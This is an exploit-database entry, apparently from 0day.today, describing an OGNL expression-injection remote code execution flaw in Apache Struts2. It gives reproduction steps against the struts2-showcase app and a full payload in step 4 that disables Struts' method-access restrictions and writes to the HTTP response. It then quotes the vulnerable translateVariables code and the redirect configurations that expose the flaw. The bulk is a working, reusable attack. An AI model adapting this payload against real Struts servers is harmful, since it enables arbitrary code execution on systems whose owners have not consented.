@@ -1,0 +1,62 @@
+id: 19248
+date: 08/23/2012
+title: Apache Struts2 Remote Code Execution
+author: kxlzx
+cves: 
+
+this method was published at xcon2012 xcon.xfocus.net.
+kxlzx http://www.inbreak.net
+
+flow this and step by step:
+
+1, down load struts2-showcase from struts.apache.org
+2, run struts2-showcase.
+3, open url: 
+http://localhost:8080/struts2-showcase/skill/edit.action?skillName=SPRING-DEV
+4, write skill name to %{expr} for example:
+%{(#_memberAccess['allowStaticMethodAccess']=true)(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#hackedbykxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#hackedbykxlzx.println('hacked by kxlzx'),#hackedbykxlzx.close())}
+5, submit and all will done.
+
+this method:
+public static String translateVariables(String expression, ValueStack stack) {
+        return translateVariables(new char[]{'$', '%'}, expression, stack, String.class, null).toString();
+    }
+look two char "$" and "%"
+
+and
+this method:
+
+    public static Object translateVariables(char[] openChars, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) {
+        // deal with the "pure" expressions first!
+        //expression = expression.trim();
+        Object result = expression;
+        for (char open : openChars) {
+.........
+            while (true) {
+..........
+                    String var = expression.substring(start + 2, end);
+
+                    Object o = stack.findValue(var, asType);
+............
+if user input is "%{expr}"
+this will execute ognl like:
+${%{expr}}
+
+this need devloper code like:
+
+<action name="redirect" class="net.inbreak.RedirectAction">
+       <result name="redirect" type="redirect">${redirectUrl}</result>
+</action>
+
+or like:
+<action name="save" class="org.apache.struts2.showcase.action.SkillAction" method="save">
+           <result type="redirect">edit.action?skillName=${currentSkill.name}</result>
+</action>
+
+----------
+kxlzx at alibaba security team.
+my blog :http://www.inbreak.net
+
+
+
+#  0day.today [2023-03-24]  #
